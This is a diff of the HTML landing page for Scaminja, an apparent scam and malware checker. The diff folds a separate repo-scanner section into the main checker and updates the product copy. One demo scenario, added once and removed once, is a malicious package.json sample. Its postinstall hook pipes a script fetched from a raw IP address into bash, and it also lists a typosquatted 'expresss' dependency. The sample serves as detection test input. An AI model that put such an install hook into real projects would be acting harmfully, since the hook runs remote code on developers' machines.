@@ -4,7 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Scaminja — Is it legit? Know in seconds.</title>
-<meta name="description" content="Paste any message, link, email, or wallet address and get an instant Safe / Caution / Scam verdict, backed by evidence from real security databases." />
+<meta name="description" content="One call: is this message, link, email, wallet, screenshot, PDF, or GitHub repo safe? Instant, evidence-backed Safe / Caution / Scam verdict for humans and AI agents." />
 <meta property="og:title" content="Scaminja — Is it legit? Know in seconds." />
 <meta property="og:description" content="Instant, evidence-backed Safe / Caution / Scam verdicts for any message, link, email, or wallet address." />
 <link rel="icon" type="image/png" href="demo/scaminja-favicon.png" />
@@ -107,7 +107,7 @@
   .console-body{position:relative;z-index:1;padding:20px}
   .console-body textarea{min-height:132px}
   .scenarios{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px;margin-top:16px}
-  @media(min-width:640px){.scenarios{grid-template-columns:repeat(4,minmax(0,1fr))}}
+  @media(min-width:640px){.scenarios{grid-template-columns:repeat(3,minmax(0,1fr))}}
   .scen{text-align:left;border:1px solid var(--line);border-radius:12px;padding:13px 14px;background:transparent;cursor:pointer;transition:.2s;color:var(--ink)}
   .scen:hover{border-color:rgba(79,227,208,.5);background:rgba(79,227,208,.05);transform:translateY(-2px)}
   .scen .si{font-size:19px;line-height:1}
@@ -248,7 +248,6 @@
     <div class="nav-right">
       <a class="nav-link hide-sm" href="#how">How it works</a>
       <a class="nav-link hide-sm" href="#check">Try it</a>
-      <a class="nav-link hide-sm" href="#repo">Repo check</a>
       <a class="nav-link hide-sm" href="#agents">API</a>
       <a class="okx" href="https://www.okx.ai" target="_blank" rel="noopener">ASP on <b>OKX.AI</b></a>
     </div>
@@ -257,9 +256,9 @@
 
 <section class="hero">
   <div class="inner hero-inner">
-    <span class="eyebrow motion"><span class="di">◆</span> AI scam &amp; fraud detection</span>
+    <span class="eyebrow motion"><span class="di">◆</span> AI scam, phishing &amp; malware detection</span>
     <h1 class="motion">Is it legit?<br><span class="grad">Know in seconds.</span></h1>
-    <p class="sub motion">Paste any message, link, email, or crypto wallet address — get an instant <b>Safe · Caution · Scam</b> verdict, backed by evidence from real security databases.</p>
+    <p class="sub motion">Throw it anything — a message, link, email, wallet address, screenshot, PDF, or a whole GitHub repo — and get an instant <b>Safe · Caution · Scam</b> verdict, backed by evidence from real security databases.</p>
     <div class="hero-actions motion">
       <a class="btn btn-primary" href="#check">Check a message <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M6 13l6 6 6-6"/></svg></a>
       <a class="btn" href="#how">How it works</a>
@@ -280,11 +279,11 @@
     <div class="kicker reveal"><span class="eyebrow"><span class="di">◆</span> How it works</span></div>
     <div class="split-intro">
       <h2 class="reveal">Evidence,<br><span class="grad">not opinion.</span></h2>
-      <p class="reveal">Most "is this a scam?" tools just guess. Scaminja extracts every link, address, and email, verifies each against authoritative databases, then shows you the proof — tagged verified fact vs assessment.</p>
+      <p class="reveal">Most "is this a scam?" tools just guess. Scaminja pulls every link, address, email, and dependency out of whatever you give it, verifies each against authoritative databases, then shows you the proof — tagged verified fact vs assessment.</p>
     </div>
     <div class="process">
-      <article class="pcard"><span class="pn">Step 01</span><h3>Extract</h3><p>Pulls every URL, domain, wallet address, token, and email sender out of whatever you paste — text or a screenshot.</p></article>
-      <article class="pcard"><span class="pn">Step 02</span><h3>Verify</h3><p>Each entity is checked in parallel against Safe Browsing, VirusTotal, GoPlus, OFAC, domain records, and brand look-alike detection — live.</p></article>
+      <article class="pcard"><span class="pn">Step 01</span><h3>Extract</h3><p>From a message, screenshot, PDF, or GitHub repo, it pulls out every URL, wallet address, token, email sender, and code dependency.</p></article>
+      <article class="pcard"><span class="pn">Step 02</span><h3>Verify</h3><p>Each one is checked in parallel — Safe Browsing, VirusTotal, GoPlus, OFAC, domain records, brand look-alikes, and the OSV malware database — live.</p></article>
       <article class="pcard"><span class="pn">Step 03</span><h3>Verdict</h3><p>A clear Safe / Caution / Scam call with the red flags, the cited evidence, and exactly what to do next — in seconds.</p></article>
       <article class="pcard end"><span class="pn">Ready</span><h3>Try it yourself</h3><p>Paste anything into the checker below — free, no account, and nothing you submit is stored.</p></article>
     </div>
@@ -296,7 +295,7 @@
     <div class="try-head">
       <div class="kicker reveal"><span class="eyebrow"><span class="di">◆</span> Try it free</span></div>
       <h2 class="reveal">Paste it.<br><span class="grad">Know instantly.</span></h2>
-      <p class="sub reveal">Drop in any suspicious message, link, email, or wallet address — Scaminja returns an evidence-backed verdict in seconds. Free, no account, nothing stored.</p>
+      <p class="sub reveal">Drop in a suspicious message, link, email, or wallet — a screenshot or PDF — or a <b>GitHub repo URL / package.json</b>. Scaminja auto-detects it and returns an evidence-backed verdict in seconds. Free, no account, nothing stored.</p>
     </div>
     <div class="console reveal" id="checker">
       <div class="console-bar">
@@ -305,7 +304,7 @@
         <span class="console-live"><span class="dot"></span> Live</span>
       </div>
       <div class="console-body">
-        <textarea id="in" placeholder="Paste a suspicious text, link, email, or wallet address — or drop / paste a screenshot or PDF…"></textarea>
+        <textarea id="in" placeholder="Paste a message, link, email, wallet address, GitHub repo URL, or package.json — or drop / paste a screenshot or PDF…"></textarea>
         <div id="atts" class="atts" hidden></div>
         <input type="file" id="filein" accept="image/png,image/jpeg,image/webp,image/gif,application/pdf" multiple hidden />
         <div class="row">
@@ -317,38 +316,11 @@
           <button class="scen" data-s="ROYAL MAIL: Your parcel has a £1.99 unpaid shipping fee. Pay within 24h or it returns to sender: https://royalmail-redelivery.info/pay"><span class="si">📦</span><b>Parcel SMS</b><small>fake delivery fee</small></button>
           <button class="scen" data-s="🎉 You are eligible for the OKB community airdrop (2,500 OKB). Connect your wallet to claim before it expires: https://okb-airdrop-claim.xyz — verify your seed phrase to receive tokens."><span class="si">🪙</span><b>Crypto airdrop</b><small>seed-phrase scam</small></button>
           <button class="scen" data-s="Hi! We reviewed your profile and want to offer you a remote data-entry role, $450/day, no interview. To onboard, please pay a $50 refundable equipment deposit via gift card and send the code."><span class="si">💼</span><b>Job offer</b><small>upfront deposit</small></button>
+          <button class="scen" data-s='{"name":"frontend-take-home","scripts":{"postinstall":"curl -s http://185.62.190.10/loader.sh | bash"},"dependencies":{"react":"^18.2.0","expresss":"^4.18.0","auth-helper-utils":"git+https://github.com/x9f2/auth-helper.git"}}'><span class="si">☠️</span><b>Malicious repo</b><small>fake take-home</small></button>
+          <button class="scen" data-s="https://github.com/expressjs/express"><span class="si">🐙</span><b>Real repo</b><small>expressjs/express</small></button>
           <button class="scen" data-s="Hey, running 10 mins late for lunch — grab us a table and I'll be right there!"><span class="si">✅</span><b>Benign</b><small>normal message</small></button>
         </div>
         <div id="out"></div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section class="try" id="repo">
-  <div class="inner">
-    <div class="try-head">
-      <div class="kicker reveal"><span class="eyebrow"><span class="di">◆</span> For developers</span></div>
-      <h2 class="reveal">Poisoned repo?<br><span class="grad">Know before you clone.</span></h2>
-      <p class="sub reveal">Fake-recruiter "take-home" repos hide malware in a dependency or an install script that runs the moment you <code>npm install</code>. Paste a GitHub URL or your package.json — Scaminja checks install hooks, typosquats, non-registry deps, and the OSV malware database.</p>
-    </div>
-    <div class="console reveal" id="repoconsole">
-      <div class="console-bar">
-        <span class="cdot safe"></span><span class="cdot caution"></span><span class="cdot scam"></span>
-        <span class="console-title">scaminja · repo scanner</span>
-        <span class="console-live"><span class="dot"></span> Live</span>
-      </div>
-      <div class="console-body">
-        <textarea id="repoin" placeholder="https://github.com/owner/repo   —   or paste your package.json…"></textarea>
-        <div class="row">
-          <button class="btn btn-primary" id="repogo"><span class="lbl">Scan repo</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
-          <span class="tag">Free · GitHub URL or package.json</span>
-        </div>
-        <div class="scenarios">
-          <button class="repo-scen scen" data-s="https://github.com/expressjs/express"><span class="si">✅</span><b>Real repo</b><small>expressjs/express</small></button>
-          <button class="repo-scen scen" data-s='{"name":"frontend-take-home","scripts":{"postinstall":"curl -s http://185.62.190.10/loader.sh | bash"},"dependencies":{"react":"^18.2.0","expresss":"^4.18.0","auth-helper-utils":"git+https://github.com/x9f2/auth-helper.git"}}'><span class="si">☠️</span><b>Malicious sample</b><small>fake take-home</small></button>
-        </div>
-        <div id="repoout"></div>
       </div>
     </div>
   </div>
@@ -359,7 +331,7 @@
     <div class="kicker reveal"><span class="eyebrow"><span class="di">◆</span> For the agent economy</span></div>
     <div class="split-intro">
       <h2 class="reveal">Built for<br><span class="grad">agents, too.</span></h2>
-      <p class="reveal">Scaminja is a paid, callable service any AI agent can rent on demand — pay per call, get structured JSON back, settled on-chain via the x402 standard.</p>
+      <p class="reveal">Scaminja is <b>one</b> paid, callable endpoint any AI agent can rent on demand — send it a message, wallet, screenshot, PDF, or a GitHub repo, and get a structured verdict + evidence back. Pay per call, settled on-chain via the x402 standard.</p>
     </div>
     <div class="agents-split">
       <div class="reveal">
@@ -381,8 +353,8 @@
   -d <span class="tok-s">'{"text":"is this a scam? …"}'</span>
 
 <span class="tok-m"># → HTTP 402: pay 0.02 USDT on X Layer (x402), then</span>
-<span class="tok-m">#   receive the verdict + evidence JSON. Repo check:</span>
-<span class="tok-m">#   POST https://scaminja.app/x402/repo-analyze</span></code></pre>
+<span class="tok-m">#   receive the verdict + evidence JSON. Same endpoint</span>
+<span class="tok-m">#   also scans a repo: {"repoUrl":"https://github.com/o/r"}</span></code></pre>
       </div>
     </div>
   </div>
@@ -508,26 +480,6 @@ function render(v, target=out){
     gsap.from(card,{y:14,opacity:0,duration:.5,ease:"power3.out"});
     gsap.to(bar,{width:risk+"%",duration:.9,ease:"power3.out",delay:.1});
   }else{ bar.style.width = risk+"%"; }
-}
-
-/* ---------------- repo & dependency safety check ---------------- */
-const repoin = $("#repoin"), repogo = $("#repogo"), repoout = $("#repoout");
-const REPO = (base || "") + "/repo-try";
-if(repogo){
-  document.querySelectorAll(".repo-scen").forEach(c => c.onclick = () => { repoin.value = c.dataset.s; repoCheck(); repoin.scrollIntoView({block:"nearest"}); });
-  repogo.onclick = repoCheck;
-}
-async function repoCheck(){
-  const val = repoin.value.trim();
-  if(!val) return;
-  repogo.disabled = true;
-  repoout.innerHTML = `<p class="tag" style="margin-top:16px"><span class="spinner"></span>Fetching manifest &amp; scanning dependencies…</p>`;
-  try{
-    const body = val.startsWith("{") ? { packageJson: val } : { repoUrl: val };
-    const r = await fetch(REPO, {method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(body)});
-    render(await r.json(), repoout);
-  }catch(e){ repoout.innerHTML = `<p class="err" style="margin-top:14px">Couldn't reach the scanner. ${esc(e.message||e)}</p>`; }
-  finally{ repogo.disabled = false; }
 }
 
 /* ---------------- copy ---------------- */
